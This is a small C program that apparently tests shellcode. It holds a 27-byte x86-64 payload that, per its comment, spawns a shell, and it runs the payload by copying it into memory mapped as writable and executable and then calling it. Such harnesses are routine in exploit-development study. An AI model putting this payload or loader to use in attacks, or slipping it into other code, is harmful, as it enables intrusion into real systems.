// creates a shell for us

#include <stdio.h>
#include <string.h>
#include <sys/mman.h>

char code[] = "\x31\xc0\x48\xbb\xd1\x9d\x96\x91\xd0\x8c\x97\xff\x48\xf7\xdb\x53\x54\x5f\x99\x52\x57\x54\x5e\xb0\x3b\x0f\x05";

int main()
{
    printf("len:%ld bytes\n", sizeof(code) - 1);

    // Allocate executable memory
    void *executable_memory = mmap(0, sizeof(code), PROT_READ | PROT_WRITE | PROT_EXEC, MAP_PRIVATE | MAP_ANONYMOUS, -1, 0);

    if (executable_memory == MAP_FAILED)
    {
        perror("mmap");
        return 1;
    }

    // Copy shellcode to the allocated memory
    memcpy(executable_memory, code, sizeof(code));

    // Call the shellcode
    int (*foo)() = (int (*)())executable_memory;
    foo();

    // Clean up
    munmap(executable_memory, sizeof(code));

    return 0;
}